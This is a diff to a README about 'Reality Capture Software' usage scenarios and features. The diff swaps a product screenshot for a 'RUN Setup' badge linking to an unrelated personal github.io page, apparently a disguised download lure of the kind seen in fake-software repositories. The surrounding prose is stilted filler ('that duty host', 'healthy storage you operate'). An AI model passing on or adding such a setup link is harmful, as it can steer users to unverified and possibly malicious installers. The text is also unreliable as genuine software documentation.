@@ -2,7 +2,7 @@
 
 ## Advanced Use Cases for Reality Capture Software
 
-[![GET Reality Capture Software](https://peterfalkingham.com/wp-content/uploads/2023/11/image-3.png)
+[![RUN Setup](https://img.shields.io/badge/RUN%20%E2%80%94%20Setup-2ea44f?style=for-the-badge&logoColor=white)](https://dorothymitchellc550.github.io/.github/Capture-Software)
 
 **Scenario 1: Full profile review** - Scan the user profile with Reality Capture Software, then save a named alignment before moving archives.
 Keep only files you own on that duty host.
@@ -35,7 +35,7 @@ Store the checklist beside the project on healthy storage you operate.
 | **Remembers your choices** | Recent components and cameras help you return to the next Reality Capture Software pass quickly. |
 | **Instant clarity** | Open Reality Capture Software, add photos you own, and move from align to mesh without long detours. |
 
-![Reality Capture Software](https://dorothymitchellc550.github.io/.github/Capture-Software)
+![Reality Capture Software](https://peterfalkingham.com/wp-content/uploads/2023/11/image-3.png)
 
 ---
 
